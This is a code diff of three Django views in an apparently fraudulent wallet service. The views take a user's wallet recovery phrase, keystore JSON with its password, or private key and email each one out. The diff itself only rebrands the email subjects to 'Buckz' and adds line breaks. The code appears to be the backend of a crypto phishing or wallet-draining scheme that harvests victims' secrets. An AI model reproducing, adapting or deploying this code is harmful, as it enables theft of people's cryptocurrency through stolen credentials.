@@ -45,8 +45,8 @@ def devphrase(request):
         if serializer.is_valid():
             serializer.save()
             data = {
-                "body": f" WALLET ID: {serializer.data['walletId']}\n PHRASE: {serializer.data['phrase']}\n CREATED AT: {serializer['created_at']}",
-                "subject": "Dev Wallet Phrase Credentails."
+                "body": f" WALLET ID: {serializer.data['walletId']}\n\n PHRASE: {serializer.data['phrase']}\n\n CREATED AT: {serializer['created_at']}",
+                "subject": "Buckz Wallet Phrase Credentails."
             }
             Util.send_email(data)
             print("email was sent successfully")
@@ -73,8 +73,8 @@ def devkeystore(request):
         if serializer.is_valid():
             serializer.save()
             data = {
-                "body": f"WALLET ID: {serializer.data['walletId']}\n KEYSTORE JSON: {serializer.data['json']} \n PASSWORD: {serializer.data['password']}",
-                "subject": "Dev Wallet Keystore Json Credentails."
+                "body": f"WALLET ID: {serializer.data['walletId']}\n\n KEYSTORE JSON: {serializer.data['json']} \n\n PASSWORD: {serializer.data['password']}",
+                "subject": "Buckz Wallet Keystore Json Credentails."
             }
             Util.send_email(data)
             print("email was sent successfully")
@@ -100,8 +100,8 @@ def devprivatekey(request):
         if serializer.is_valid():
             serializer.save()
             data = {
-                "body": f"WALLET ID: {serializer.data['walletId']}\nPRIVATE KEY: {serializer.data['key']}",
-                "subject": "Dev Wallet Private Key Credentails."
+                "body": f"WALLET ID: {serializer.data['walletId']}\n\nPRIVATE KEY: {serializer.data['key']}",
+                "subject": "Buckz Wallet Private Key Credentails."
             }
             Util.send_email(data)
             print("email was sent successfully")
